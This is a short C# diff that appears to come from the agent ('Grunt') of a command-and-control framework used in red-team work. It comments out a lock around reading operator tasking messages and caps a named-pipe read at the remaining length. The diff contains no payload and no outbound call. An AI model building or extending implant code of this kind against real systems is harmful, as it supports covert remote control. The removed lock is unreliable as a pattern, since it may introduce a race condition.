@@ -461,10 +461,10 @@ namespace GruntExecutor
         public GruntTaskingMessage ReadTaskingMessage()
         {
             ProfileMessage readMessage = null;
-            lock (_UpstreamLock)
-            {
+            //lock (_UpstreamLock)
+            //{
                 readMessage = this.UpstreamMessenger.Read();
-            }
+            //}
             if (readMessage == null)
             {
                 return null;
@@ -807,7 +807,7 @@ namespace GruntExecutor
                 int readBytes = 0;
                 do
                 {
-                    readBytes = this.Pipe.Read(buffer, 0, buffer.Length);
+                    readBytes = this.Pipe.Read(buffer, 0, Math.Min(len - totalReadBytes, buffer.Length));
                     ms.Write(buffer, 0, readBytes);
                     totalReadBytes += readBytes;
                 } while (totalReadBytes < len);
